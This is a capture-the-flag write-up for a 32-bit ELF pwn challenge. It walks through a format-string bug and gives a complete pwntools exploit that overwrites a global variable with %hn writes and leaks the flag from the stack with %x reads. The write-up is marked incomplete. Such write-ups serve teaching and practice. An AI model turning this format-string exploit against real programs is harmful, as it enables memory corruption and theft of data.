## Security Code [445 pts]

**Category:** Pwn
**Solves:** 36

### Description
>Can you print the flag?

## Solution

In this challenge we are provided an 32bit ELF binary which is vulnerable to format string.
First I checked `checksec` command on this file:

```bash
$ checksec --file=securitycode 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   83) Symbols	  No	0
```

As we can se PIE is not enabled and checking these details we can use typical format string techniques to exploit this bug.
Decompiling this binary with IDA results us with following images:


![main](images/1.jpg)
![hello_admin](images/1.jpg)
![auth_admin](images/1.jpg)

As we can see in the images we should change value in `security_code` using format strings to pass the condition,
And get to the `auth_admin` which will lead us to flag.

Our next step is to find reference location of `security_code`. using `readelf`:

```bash
$ readelf -a securitycode | grep security_code
    66: 0804c03c     4 OBJECT  GLOBAL DEFAULT   26 security_code
```

### Writeup is not completed, will be completed with more details

Here is the final exploit code to receive the flag:

```python
from pwn import *

flag = ''

for i in range(30):
    # r = process("./securitycode")
    r = remote('185.97.118.167', 7040)

    # Value to overwrite is: xABADCAFE
    # ABAD: 43949
    # CAFE: 51966

    r.recvuntil("Enter 'A' for admin and 'U' for user.")
    r.sendline('A')
    r.recvuntil('Enter you name:')

    payload = '\x3e\xc0\x04\x08\x3c\xc0\x04\x08%43941x%15$hn%8017x%16$hn'
    r.sendline(payload)

    # Now try to read 6 bytes of the flag
    r.recvuntil('Enter your password:')
    payload = '%{}$x'.format(i)
    r.sendline(payload)

    x = r.recvline()
    x += r.recvline()
    x += r.recvline()
    x = x.replace('The password is ', '').strip()
    # print(x.decode('hex'))
    try:
        flag += bytearray.fromhex(x).decode()[::-1]
    except:
        pass

print(flag)
```